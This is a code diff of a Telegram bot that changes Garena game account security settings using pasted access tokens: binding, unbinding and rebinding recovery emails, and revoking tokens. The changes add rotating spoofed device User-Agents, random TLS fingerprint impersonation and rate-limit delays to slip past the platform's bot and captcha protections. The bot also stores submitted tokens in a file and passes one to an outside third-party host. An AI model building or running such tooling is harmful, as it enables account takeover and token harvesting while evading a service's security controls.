@@ -2,10 +2,10 @@ import json
 import logging
 import os
 import time
+import random
 import threading
 from flask import Flask
 
-# requests-এর বদলে curl_cffi ব্যবহার করা হয়েছে TLS Fingerprint বাইপাস করার জন্য
 from curl_cffi import requests
 
 from telegram import (
@@ -40,9 +40,6 @@ REQUIRED_CHANNELS = [
 
 YOUTUBE_URL = "https://youtube.com/@RFG_GAMERR"
 
-# আসল অ্যান্ড্রয়েড অ্যাপের TLS ইমপারসোনেশনের জন্য ব্যবহৃত নাম
-IMPERSONATE_TARGET = "chrome110"  
-
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
     level=logging.INFO,
@@ -76,15 +73,29 @@ def keep_alive_ping():
         time.sleep(120)
 
 # ============================================================
-# CONSTANTS & HEADERS
+# DYNAMIC USER-AGENTS & HEADERS ROTATION
 # ============================================================
-COMMON_HEADERS = {
-    "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "Accept": "application/json",
-    "Connection": "Keep-Alive",
-    "Accept-Encoding": "gzip",
-}
+USER_AGENTS = [
+    "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
+    "GarenaMSDK/4.0.38(SAMSUNG SM-G998B ;Android 12;en;US;app 1.123.1 2019120270;)",
+    "GarenaMSDK/4.0.40(XIAOMI 2201116PG ;Android 13;en;IN;app 1.123.1 2019120270;)",
+    "GarenaMSDK/4.0.39(VIVO V2111 ;Android 11;en;BD;app 1.123.1 2019120270;)",
+    "GarenaMSDK/4.0.42(REALME RMX3371 ;Android 13;en;MY;app 1.123.1 2019120270;)"
+]
+
+IMPERSONATE_TARGETS = ["chrome110", "chrome116", "edge101", "safari15_3"]
+
+def get_dynamic_headers():
+    return {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Accept": "application/json",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip",
+    }
+
+def get_random_impersonate():
+    return random.choice(IMPERSONATE_TARGETS)
 
 MAIN_MENU = [
     [
@@ -211,7 +222,7 @@ def parse_api_error(res_json_or_text):
     err_str = str(res_json_or_text)
     
     if "captcha" in err_str.lower() or "geo.captcha-delivery.com" in err_str:
-        return "⚠️ <b>Action Failed!</b>\n🛡️ Captcha Protection Triggered! Server IP is restricted by Garena."
+        return "⚠️ <b>Action Failed!</b>\n🛡️ Captcha Protection Triggered! Please wait 1-2 minutes before trying again."
     elif "error_token" in err_str or "error_access_token" in err_str or "invalid_access_token" in err_str or "error_token_invalid" in err_str:
         return "⚠️ <b>Action Failed!</b>\n🔐 Invalid or Expired Access Token!"
     elif "error_email_used" in err_str:
@@ -234,13 +245,14 @@ def convert_seconds(s):
     return f"{d} Day {h} Hour {m} Min {s} Sec"
 
 # ============================================================
-# UTILS & API CALLS (WITH IMPERSONATE)
+# API CALLS WITH ROTATION & DELAY
 # ============================================================
 def api_check_recovery(access_token):
+    time.sleep(1) # Anti-rate-limit delay
     url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
     payload = {'app_id': "100067", 'access_token': access_token}
     try:
-        rsp = requests.get(url, params=payload, headers=COMMON_HEADERS, impersonate=IMPERSONATE_TARGET, timeout=15)
+        rsp = requests.get(url, params=payload, headers=get_dynamic_headers(), impersonate=get_random_impersonate(), timeout=15)
         if rsp.status_code == 200:
             data = rsp.json()
             if "error" in data:
@@ -265,11 +277,12 @@ def api_check_platform(access_token):
     if not access_token:
         return "⚠️ <b>Please provide an Access Token!</b>"
         
+    time.sleep(1)
     try:
         url = "https://100067.connect.garena.com/bind/app/platform/info/get"
         params = {'access_token': access_token}
         
-        r = requests.get(url, params=params, headers=COMMON_HEADERS, impersonate=IMPERSONATE_TARGET, timeout=15)
+        r = requests.get(url, params=params, headers=get_dynamic_headers(), impersonate=get_random_impersonate(), timeout=15)
         
         if r.status_code not in [200, 201]:
             return "⚠️ <b>Action Failed!</b>\n🔐 Invalid or Expired Access Token!"
@@ -296,10 +309,11 @@ def api_check_platform(access_token):
         return f"❌ <b>Error:</b> <code>{str(e)}</code>"
 
 def api_cancel_request(access_token):
+    time.sleep(1)
     url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
     payload = {'app_id': "100067", 'access_token': access_token}
     try:
-        rsp = requests.post(url, data=payload, headers=COMMON_HEADERS, impersonate=IMPERSONATE_TARGET, timeout=15)
+        rsp = requests.post(url, data=payload, headers=get_dynamic_headers(), impersonate=get_random_impersonate(), timeout=15)
         if rsp.status_code == 200:
             res = rsp.json()
             if res.get("result") == 0:
@@ -310,9 +324,10 @@ def api_cancel_request(access_token):
         return f"❌ <b>Error:</b> <code>{str(e)}</code>"
 
 def api_revoke_token(access_token):
+    time.sleep(1)
     url = f"https://100067.connect.garena.com/oauth/logout?access_token={access_token}"
     try:
-        r = requests.get(url, impersonate=IMPERSONATE_TARGET, timeout=15)
+        r = requests.get(url, headers=get_dynamic_headers(), impersonate=get_random_impersonate(), timeout=15)
         if r.text.strip() == '{"result":0}': 
             return "🎉 <b>TOKEN REVOKED SUCCESSFULLY!</b>"
         return "⚠️ <b>Action Failed!</b>\n🔐 Invalid or Expired Access Token!"
@@ -320,10 +335,11 @@ def api_revoke_token(access_token):
         return f"❌ <b>Error:</b> <code>{str(e)}</code>"
 
 def api_update_bio(access_token, bio_text):
+    time.sleep(1)
     url = "https://ob54-asd-long-bio.vercel.app/bio"
     params = {'bio': bio_text, 'access': access_token}
     try:
-        r = requests.get(url, params=params, impersonate=IMPERSONATE_TARGET, timeout=15)
+        r = requests.get(url, params=params, headers=get_dynamic_headers(), impersonate=get_random_impersonate(), timeout=15)
         res = r.json()
         
         status = res.get("status") or res.get("Status")
@@ -386,7 +402,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if query.data == "check_joined":
         user_id = query.from_user.id
-        not_joined = await check_user_joined(context.bot, user_id)
+        not_joined = await check_user_joined(query.bot, user_id)
 
         if not_joined:
             await send_join_request(query, not_joined, is_callback=True)
@@ -559,9 +575,10 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         elif waiting == "add_email_token":
             save_token_to_json(text, "Add Recovery Email", user_id)
             context.user_data["access"] = text
+            time.sleep(1)
             url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
             pyl = {'app_id': "100067", 'access_token': text, 'email': context.user_data['email'], 'locale': "en_MA"}
-            res = requests.post(url, data=pyl, headers=COMMON_HEADERS, impersonate=IMPERSONATE_TARGET)
+            res = requests.post(url, data=pyl, headers=get_dynamic_headers(), impersonate=get_random_impersonate())
             
             if res.status_code == 200 and res.json().get("result") == 0:
                 context.user_data["waiting"] = "add_email_otp"
@@ -573,9 +590,10 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
             
         elif waiting == "add_email_otp":
+            time.sleep(1)
             v_url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
             v_pyl = {'app_id': "100067", 'access_token': context.user_data['access'], 'otp': text, 'email': context.user_data['email']}
-            v_res = requests.post(v_url, data=v_pyl, headers=COMMON_HEADERS, impersonate=IMPERSONATE_TARGET)
+            v_res = requests.post(v_url, data=v_pyl, headers=get_dynamic_headers(), impersonate=get_random_impersonate())
             
             if v_res.status_code == 200 and v_res.json().get("verifier_token"):
                 auth = v_res.json().get("verifier_token")
@@ -583,7 +601,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 
                 b_url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
                 b_pyl = {'app_id': "100067", 'access_token': context.user_data['access'], 'verifier_token': auth, 'secondary_password': "91B4D142823F7D20C5F08DF69122DE43F35F057A988D9619F6D3138485C9A203", 'email': context.user_data['email']}
-                b_res = requests.post(b_url, data=b_pyl, headers=COMMON_HEADERS, impersonate=IMPERSONATE_TARGET)
+                b_res = requests.post(b_url, data=b_pyl, headers=get_dynamic_headers(), impersonate=get_random_impersonate())
                 
                 if b_res.status_code == 200 and b_res.json().get("result") == 0:
                     await update.message.reply_text(f"🎉 <b>Successfully Added Recovery Email!</b>\n📧 Email: <code>{context.user_data['email']}</code>", parse_mode="HTML")
@@ -610,9 +628,10 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data["access"] = text
             if method == "otp":
                 await update.message.reply_text("⏳ <i>Sending OTP...</i>", parse_mode="HTML")
+                time.sleep(1)
                 url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
                 data = {"email": context.user_data["email"], "locale": "en_MA", "region": "IND", "app_id": "100067", "access_token": text}
-                r = requests.post(url, headers=COMMON_HEADERS, data=data, impersonate=IMPERSONATE_TARGET)
+                r = requests.post(url, headers=get_dynamic_headers(), data=data, impersonate=get_random_impersonate())
                 
                 if r.status_code == 200 and r.json().get("result") == 0:
                     context.user_data["waiting"] = "unbind_otp_input"
@@ -627,6 +646,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         elif waiting in ["unbind_otp_input", "unbind_pass_input"]:
             await update.message.reply_text("⏳ <i>Verifying Identity...</i>", parse_mode="HTML")
+            time.sleep(1)
             v_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
             v_data = {"email": context.user_data["email"], "app_id": "100067", "access_token": context.user_data["access"]}
             if waiting == "unbind_otp_input":
@@ -634,12 +654,12 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             else:
                 v_data["secondary_password"] = text
 
-            r = requests.post(v_url, headers=COMMON_HEADERS, data=v_data, impersonate=IMPERSONATE_TARGET)
+            r = requests.post(v_url, headers=get_dynamic_headers(), data=v_data, impersonate=get_random_impersonate())
             res = r.json()
             if res.get("result") == 0 and res.get("identity_token"):
                 u_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
                 u_data = {"app_id": "100067", "access_token": context.user_data["access"], "identity_token": res.get("identity_token")}
-                u_r = requests.post(u_url, headers=COMMON_HEADERS, data=u_data, impersonate=IMPERSONATE_TARGET)
+                u_r = requests.post(u_url, headers=get_dynamic_headers(), data=u_data, impersonate=get_random_impersonate())
                 u_res = u_r.json()
                 
                 if u_res.get("result") == 0:
@@ -676,9 +696,10 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if method == "otp":
                 old = context.user_data["old"]
                 await update.message.reply_text(f"⏳ <i>Sending OTP to {old}...</i>", parse_mode="HTML")
+                time.sleep(1)
                 url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
                 data = {'email': old, 'locale': 'en_MA', 'region': 'IND', 'app_id': '100067', 'access_token': context.user_data["access"]}
-                r = requests.post(url, headers=COMMON_HEADERS, data=data, impersonate=IMPERSONATE_TARGET)
+                r = requests.post(url, headers=get_dynamic_headers(), data=data, impersonate=get_random_impersonate())
                 
                 if r.json().get("result") == 0:
                     context.user_data["waiting"] = "change_old_otp"
@@ -697,6 +718,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             acc = context.user_data["access"]
             
             await update.message.reply_text("⏳ <i>Verifying Identity...</i>", parse_mode="HTML")
+            time.sleep(1)
             v_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
             v_data = {'email': old, 'app_id': '100067', 'access_token': acc}
             if waiting == "change_old_otp":
@@ -704,14 +726,14 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             else:
                 v_data["secondary_password"] = text
 
-            r = requests.post(v_url, headers=COMMON_HEADERS, data=v_data, impersonate=IMPERSONATE_TARGET)
+            r = requests.post(v_url, headers=get_dynamic_headers(), data=v_data, impersonate=get_random_impersonate())
             res = r.json()
             if res.get("result") == 0 and res.get("identity_token"):
                 context.user_data["identity_token"] = res.get("identity_token")
                 
                 s_url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
                 s_data = {'email': new, 'locale': 'en_MA', 'region': 'IND', 'app_id': '100067', 'access_token': acc}
-                s_r = requests.post(s_url, headers=COMMON_HEADERS, data=s_data, impersonate=IMPERSONATE_TARGET)
+                s_r = requests.post(s_url, headers=get_dynamic_headers(), data=s_data, impersonate=get_random_impersonate())
                 
                 if s_r.json().get("result") == 0:
                     context.user_data["waiting"] = "change_new_otp"
@@ -730,16 +752,17 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             id_tok = context.user_data["identity_token"]
 
             await update.message.reply_text("⏳ <i>Verifying New Email OTP...</i>", parse_mode="HTML")
+            time.sleep(1)
             v_url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
             v_data = {'email': new, 'app_id': '100067', 'access_token': acc, 'otp': text}
-            r = requests.post(v_url, headers=COMMON_HEADERS, data=v_data, impersonate=IMPERSONATE_TARGET)
+            r = requests.post(v_url, headers=get_dynamic_headers(), data=v_data, impersonate=get_random_impersonate())
             res = r.json()
             ver_tok = res.get("verifier_token")
             
             if ver_tok:
                 r_url = "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request"
                 r_data = {'identity_token': id_tok, 'email': new, 'app_id': '100067', 'verifier_token': ver_tok, 'access_token': acc}
-                fin = requests.post(r_url, headers=COMMON_HEADERS, data=r_data, impersonate=IMPERSONATE_TARGET)
+                fin = requests.post(r_url, headers=get_dynamic_headers(), data=r_data, impersonate=get_random_impersonate())
                 f_res = fin.json()
                 
                 if f_res.get("result") == 0:
